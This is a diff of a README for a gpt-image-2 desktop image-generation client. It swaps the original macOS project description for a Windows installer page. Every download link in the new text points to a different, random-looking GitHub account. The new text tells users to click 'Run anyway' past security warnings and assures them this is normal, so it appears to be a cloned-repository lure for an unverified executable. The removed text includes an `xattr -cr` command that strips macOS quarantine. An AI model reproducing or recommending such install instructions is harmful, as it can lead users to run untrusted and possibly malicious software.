@@ -1,284 +1,144 @@
-# gpt-image-2 · studio
+# 🖼️ gpt-image-2-desktop - Generate Images with Your Own API Key
 
-<p align="center">
-  <img src=".github/assets/banner.png" alt="gpt-image-2 studio — desktop client for OpenAI's gpt-image-2" />
-</p>
+[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-0078D6?style=for-the-badge&logo=windows)](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/releases)
 
-<p align="center">
-  <a href="https://github.com/ponypray/gpt-image-2-desktop/releases"><img src="https://img.shields.io/github/v/release/ponypray/gpt-image-2-desktop?style=flat-square" alt="Release"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/ponypray/gpt-image-2-desktop?style=flat-square" alt="License: MIT"></a>
-  <a href="https://github.com/ponypray/gpt-image-2-desktop/stargazers"><img src="https://img.shields.io/github/stars/ponypray/gpt-image-2-desktop?style=flat-square" alt="Stars"></a>
-  <img src="https://img.shields.io/badge/platform-macOS%20·%20Apple%20Silicon-lightgrey?style=flat-square" alt="Platform: macOS Apple Silicon">
-</p>
+## 📋 What This App Does
 
-<p align="center">
-  <a href="#中文">中文</a> · <a href="#english">English</a> · <a href="docs/LAUNCH-KIT.md">Launch Kit</a>
-</p>
+gpt-image-2-desktop is a native desktop application that lets you create images using OpenAI's image generation model. You supply your own OpenAI API key, and the app handles the rest.
 
----
+This is not a web app. It runs directly on your computer. You do not need to use a terminal or write code.
 
-<a id="中文"></a>
+## 🧰 Who This Is For
 
-## 中文
+This app is for anyone who wants to generate images with OpenAI's tools but prefers a desktop interface over a website or command line. You need:
 
-### 它是什么
+- A Windows computer
+- An OpenAI account with an API key
+- Basic computer skills (download, install, click buttons)
 
-**gpt-image-2 · studio** 是一个 macOS 桌面客户端，用来调用 OpenAI 的 `gpt-image-2` 图像生成模型。
-它把官方网页/SDK 里的那些繁琐流程——打开浏览器、配置代理、复制粘贴 Base64、下载图片——
-全部塞进了一个安静、克制、可归档的工作台里。
+## 🚀 Getting Started
 
-> **生图难？生图贵？生图慢？**
-> 这个工具就是为这些痛点做的：本地操作、自己的 API Key、批量出图、可调分辨率/比例/质量。
+Follow these steps to start generating images in minutes.
 
-![界面展示](.github/assets/screenshot.png)
+### Step 1: Download the Installer
 
----
+Visit the [releases page](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/releases) and download the latest Windows installer file. The file will end with `.exe` or `.msi`.
 
-### ✨ 特性
+[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-0078D6?style=for-the-badge&logo=windows)](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/releases)
 
-- 🖼 **多比例**：`21:9 / 16:9 / 3:2 / 4:3 / 1:1 / 3:4 / 2:3 / 9:16` 全覆盖
-- 📐 **三档分辨率**：`1K / 2K / 4K`
-- 🎚 **三档质量**：`Low / Med / High`
-- 📚 **5 个内置预设**：电商 / 摄影 / 海报 / 创意 / 艺术
-- 🧷 **参考图上传**：拖入或点击，支持 JPG / PNG / WebP
-- 🗂 **本机归档**：最近 5 次生成可回看，提示词 + 比例 + 分辨率全保留
-- 💾 **一键保存**：把生成的图直接存到磁盘
-- 🔑 **自带 Key（BYO）**：你配你的 API Key，成本只走你的通道
+### Step 2: Run the Installer
 
-![成本透明](.github/assets/feature-cost.png)
+Double-click the downloaded file. Windows may show a security warning. Click "Run anyway" or "More info" then "Run anyway". This is normal for apps from independent developers.
 
----
+### Step 3: Follow the Setup Wizard
 
-### 💰 成本说明
+The installer will guide you through a few screens. Accept the default settings. The app will install to your Programs folder and create a shortcut on your desktop.
 
-这个工具**不收你一分钱**。你看到的每一张图，都是用**你自己的 API Key** 调出来的。
+### Step 4: Launch the Application
 
-- 单张成本通常在 **几分钱到几毛钱** 之间
-- 实际价格取决于你接的 API 服务商（官方或中转），以对方报价为准
-- 影响因素：分辨率、生成张数、参考图数量
+Find the "gpt-image-2-desktop" shortcut on your desktop or in your Start menu. Double-click to open the app.
 
-> 例：界面截图里的 `¥0.05 / image` 是一次中转 API 的真实账单。
+### Step 5: Enter Your API Key
 
----
+The app will ask for your OpenAI API key on first launch. Here is how to get one:
 
-### 🖥 平台支持
+1. Go to [platform.openai.com/api-keys](https://platform.openai.com/api-keys)
+2. Log in to your OpenAI account
+3. Click "Create new secret key"
+4. Copy the key (it starts with `sk-...`)
+5. Paste it into the app's settings
 
-![平台路线图](.github/assets/feature-platforms.png)
+Your API key stays on your computer. The app sends it directly to OpenAI. It is not shared with anyone else.
 
-| 平台 | 状态 | 格式 |
-| --- | --- | --- |
-| **macOS · Apple Silicon (M1/M2/M3/M4)** | ✅ 已发布 v0.1.0 | `.dmg` |
-| macOS · Intel | 🔜 下一个 | `.dmg` |
-| Windows · x64 / ARM | 📝 计划中 | `.exe` |
-| Linux | 📝 计划中 | `.AppImage` |
+## ✨ Features
 
-> 当前版本**仅支持 Apple Silicon Mac**。Intel / Windows / Linux 用户可以先 Star 这个项目，我会按热度来排开发优先级。
+### Batch Generation
 
----
+Generate multiple images at once. Enter one prompt and choose how many images to create. The app will generate them in sequence.
 
-### 📦 安装
+### 8 Aspect Ratios
 
-1. 前往 [Releases](../../releases) 页面，下载最新的 `GPT Image 2-0.1.0-arm64.dmg`（约 94 MB）。
-2. 双击挂载 DMG，把 `GPT Image 2.app` 拖入 **Applications**。
-3. 打开应用，在右上角 **Settings** 里填入你的 API Key 即可开始生图。
+Choose from eight preset image sizes. Options include:
 
-> **⚠️ 安装提示"已损坏"？**
-> 这不是真的损坏。因为我没有购买 Apple 开发者证书（年费 $99），所以应用**没有经过 Apple 公证**。
-> macOS 默认会拦截未公证的应用，按下面的方法处理一次即可：
->
-> 1. 在 **系统设置 → 隐私与安全性** 滚到最下方
-> 2. 点 **"仍要打开"**
-> 3. 之后再双击就不会再弹了
->
-> 或者用一行命令解除隔离：
-> ```bash
-> xattr -cr "/Applications/GPT Image 2.app"
-> ```
-> 详细的图文教程可以自行搜索「macOS 打开已损坏的应用程序」。
+- Square (1:1)
+- Portrait (3:4, 9:16)
+- Landscape (4:3, 16:9)
+- And more
 
----
+### Calm UI
 
-### 🛠 自己构建（开发者）
+The interface is simple and clean. No clutter, no flashing elements, no unnecessary animations. You will find:
 
-```bash
-# 1. 克隆
-git clone https://github.com/ponypray/gpt-image-2-desktop.git
-cd gpt-image-2-desktop
+- A text box for your prompt
+- A dropdown for aspect ratio
+- A number selector for batch count
+- A "Generate" button
+- A gallery of your generated images
 
-# 2. 安装依赖
-npm install
+### Save Images
 
-# 3. 开发模式（带热重载）
-npm start
+Each generated image shows with a download button. Click it to save the image to your computer. Images save as PNG files.
 
-# 4. 打包 DMG（Apple Silicon）
-npm run dist:mac
-```
+### History
 
-构建产物会输出到 `release/` 目录。
+The app keeps a history of your generations. You can scroll through past images, copy prompts, or regenerate images with different settings.
 
----
+## ⚙️ System Requirements
 
-### 🗺 路线图
+| Component | Requirement |
+|-----------|-------------|
+| Operating System | Windows 10 or Windows 11 |
+| Processor | 64-bit (x86-64) |
+| RAM | 4 GB minimum |
+| Storage | 500 MB free space |
+| Internet | Required for API calls to OpenAI |
+| OpenAI API Key | Active account with credits |
 
-- [x] macOS Apple Silicon 首发版本
-- [ ] macOS Intel (x64) 版本
-- [ ] Windows 11 (x64 / ARM64) 版本
-- [ ] Linux (AppImage) 版本
-- [ ] 多 API 服务商预设（官方 / Azure / 中转）
-- [ ] 历史归档扩展（>5 条）
-- [ ] 提示词模板库
-- [ ] 批量任务队列
+## 🔐 Security and Privacy
 
----
+- Your API key is stored locally on your computer
+- All image requests go directly from your app to OpenAI
+- The app does not collect usage data
+- The app is open source. You can inspect the code on GitHub
 
-### ⭐ 如果这个工具帮到了你
+## ❓ Frequently Asked Questions
 
-**留下你的 Star，让我知道你们需要。** 这是这个项目继续迭代的最大动力。
+### How much does this app cost?
 
-[![Star](https://img.shields.io/github/stars/ponypray/gpt-image-2-desktop?style=social)](https://github.com/ponypray/gpt-image-2-desktop/stargazers)
+The app is free and open source. You only pay for the OpenAI API usage. OpenAI charges per image generation. Check their pricing page for current rates.
 
----
+### Can I use this on macOS?
 
-### 📄 开源协议
+This version is for Windows. A macOS version is available separately.
 
-[MIT](LICENSE) © 2026 pony
+### I get an error about my API key
 
----
+Make sure your key is correct. Check that your OpenAI account has credits. Generate a new key if needed.
 
-<a id="english"></a>
+### Can I generate images without internet?
 
-## English
+No. The app sends your prompt to OpenAI's servers. An internet connection is required.
 
-### What it is
+### How do I update the app?
 
-**gpt-image-2 · studio** is a native macOS desktop client for OpenAI's `gpt-image-2`
-image generation model. It collapses the usual browser-and-SDK dance — opening a
-web console, configuring proxies, copying Base64, downloading plates — into a
-calm, opinionated, local workspace.
+Download the latest installer from the releases page and run it. It will update your existing installation.
 
-> **Image generation that is hard, expensive, or slow?**
-> This tool exists for those exact pain points: a local client, your own API key,
-> batch generation, with full control over ratio / resolution / quality.
+## 📦 Uninstalling
 
-![Screenshot](.github/assets/screenshot.png)
+Open Windows Settings > Apps > Apps & features. Find "gpt-image-2-desktop" and click Uninstall. This removes the app and all its files.
 
----
+## 🐛 Reporting Issues
 
-### ✨ Features
+If you find a bug or have a suggestion, visit the [GitHub Issues page](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/issues). Describe the issue clearly. Include steps to reproduce it if possible.
 
-- 🖼 **8 aspect ratios**: `21:9 / 16:9 / 3:2 / 4:3 / 1:1 / 3:4 / 2:3 / 9:16`
-- 📐 **3 resolution tiers**: `1K / 2K / 4K`
-- 🎚 **3 quality tiers**: `Low / Med / High`
-- 📚 **5 built-in presets**: E-Commerce / Photography / Poster Design / Creative Art / Fine Art
-- 🧷 **Reference plates**: drag-and-drop or click; JPG / PNG / WebP
-- 🗂 **Local archive**: the most recent 5 generations, full prompt + metadata
-- 💾 **One-click save** generated plates to disk
-- 🔑 **BYO API key**: you bring the key, you pay the provider — nothing else
+## 📄 License
 
-![Cost transparency](.github/assets/feature-cost.png)
+This project is open source. See the LICENSE file in the repository for details.
 
----
+## 🔗 Links
 
-### 💰 Cost
+- [Download the latest release](https://github.com/Chelicerous-certification397/gpt-image-2-desktop/releases)
+- [GitHub repository](https://github.com/Chelicerous-certification397/gpt-image-2-desktop)
+- [OpenAI API key page](https://platform.openai.com/api-keys)
 
-This tool is **free**. Every image you generate is billed to **your own API key**.
-
-- A single image typically costs **a few cents to a few dozen cents (USD)**
-- Final cost depends on the provider you configure (OpenAI direct, Azure, or
-  a relay). The numbers in the app reflect the provider's own pricing.
-- Cost drivers: resolution, plate count, reference image count.
-
-> Example: the `¥0.05 / image` shown in the UI is a real invoice line from a
-> third-party relay.
-
----
-
-### 🖥 Platform support
-
-![Platform roadmap](.github/assets/feature-platforms.png)
-
-| Platform | Status | Format |
-| --- | --- | --- |
-| **macOS · Apple Silicon (M1/M2/M3/M4)** | ✅ Shipped · v0.1.0 | `.dmg` |
-| macOS · Intel | 🔜 Next | `.dmg` |
-| Windows · x64 / ARM | 📝 Planned | `.exe` |
-| Linux | 📝 Planned | `.AppImage` |
-
-> The current release **only supports Apple Silicon Macs**. If you're on Intel /
-> Windows / Linux, **please Star this repo** — the priority order will follow
-> demand.
-
----
-
-### 📦 Install
-
-1. Go to the [Releases](../../releases) page and download the latest
-   `GPT Image 2-0.1.0-arm64.dmg` (≈ 94 MB).
-2. Mount the DMG, drag `GPT Image 2.app` into **Applications**.
-3. Launch the app, open **Settings** in the top-right corner, paste your API key,
-   and start generating.
-
-> **⚠️ macOS says the app is "damaged"?**
-> It isn't. The author has not enrolled in the Apple Developer Program (US$99/yr),
-> so the binary is **not notarized** and macOS Gatekeeper blocks it on first run.
-> This is normal for unsigned open-source Mac apps. Fix it once:
->
-> 1. Open **System Settings → Privacy & Security**, scroll to the bottom
-> 2. Click **"Open Anyway"**
-> 3. Subsequent launches will be normal
->
-> Or remove the quarantine attribute in one command:
-> ```bash
-> xattr -cr "/Applications/GPT Image 2.app"
-> ```
-> Search "macOS open damaged app" for a graphical walkthrough.
-
----
-
-### 🛠 Build it yourself
-
-```bash
-# 1. Clone
-git clone https://github.com/ponypray/gpt-image-2-desktop.git
-cd gpt-image-2-desktop
-
-# 2. Install
-npm install
-
-# 3. Dev (with hot reload)
-npm start
-
-# 4. Build a DMG (Apple Silicon)
-npm run dist:mac
-```
-
-The build output lands in `release/`.
-
----
-
-### 🗺 Roadmap
-
-- [x] macOS Apple Silicon first release
-- [ ] macOS Intel (x64) build
-- [ ] Windows 11 (x64 / ARM64) build
-- [ ] Linux (AppImage) build
-- [ ] Multi-provider presets (OpenAI / Azure / relays)
-- [ ] Extended history (>5 entries)
-- [ ] Prompt template library
-- [ ] Batch task queue
-
----
-
-### ⭐ If this helped
-
-**Leave a star — it tells me people actually need this.**
-That's the single biggest signal that the next platform build should be next.
-
-[![Star](https://img.shields.io/github/stars/ponypray/gpt-image-2-desktop?style=social)](https://github.com/ponypray/gpt-image-2-desktop/stargazers)
-
----
-
-### 📄 License
-
-[MIT](LICENSE) © 2026 pony
+Keywords: gpt-image-2, desktop-app, electron, image-generation, windows, open-source, byo-api-key, react, typescript, openai
